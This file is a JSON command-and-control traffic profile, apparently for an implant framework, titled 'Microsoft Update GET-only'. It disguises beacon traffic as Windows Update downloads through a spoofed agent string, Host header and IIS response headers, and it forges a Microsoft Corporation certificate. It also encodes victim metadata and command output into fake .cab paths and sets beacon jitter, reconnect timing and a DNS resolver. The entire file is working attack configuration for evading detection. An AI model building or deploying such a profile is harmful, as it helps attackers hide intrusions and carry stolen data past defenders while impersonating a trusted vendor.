{
  "name": "Microsoft Update GET-only",
  "http_config": {
    "user_agent": "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40",
    "headers": {
      "Accept": "*/*",
      "Host": "download.windowsupdate.com"
    },
    "server_headers": {
      "Content-Type": "application/vnd.ms-cab-compressed",
      "Server": "Microsoft-IIS/8.5",
      "MSRegion": "N. America",
      "Connection": "keep-alive",
      "X-Powered-By": "ASP.NET"
    }
  },
  "https_config": {
    "certificate": {
      "common_name": "www.windowsupdate.com",
      "organization": "Microsoft Corporation",
      "organizational_unit": "Microsoft IT",
      "country": "US",
      "state": "WA",
      "locality": "Redmond",
      "validity": 365
    }
  },
  "reconnect_interval": 60000,
  "jitter": 20,
  "max_errors": 10,
  "http_get": {
    "path": "/c/msdownload/update/others/2016/12/29136388_",
    "method": "GET",
    "headers": {
      "Accept": "*/*",
      "Host": "download.windowsupdate.com"
    },
    "metadata": {
      "type": "uri",
      "encoding": "base64url",
      "append": ".cab"
    },
    "server_headers": {
      "Content-Type": "application/vnd.ms-cab-compressed",
      "Server": "Microsoft-IIS/8.5",
      "MSRegion": "N. America",
      "Connection": "keep-alive",
      "X-Powered-By": "ASP.NET"
    }
  },
  "http_post": {
    "path": "/c/msdownload/update/others/2016/12/3215234_",
    "method": "GET",
    "headers": {
      "Accept": "*/*"
    },
    "id": {
      "type": "header",
      "name": "Host",
      "encoding": "base64url",
      "prepend": "download.windowsupdate.com/c/"
    },
    "output": {
      "type": "uri",
      "encoding": "base64url",
      "append": ".cab"
    },
    "server_headers": {
      "Content-Type": "application/vnd.ms-cab-compressed",
      "Server": "Microsoft-IIS/8.5",
      "MSRegion": "N. America",
      "Connection": "keep-alive",
      "X-Powered-By": "ASP.NET"
    }
  },
  "dns_config": {
    "idle_resolver": "8.8.4.4",
    "dns_sleep": 0,
    "max_length": 235
  }
}
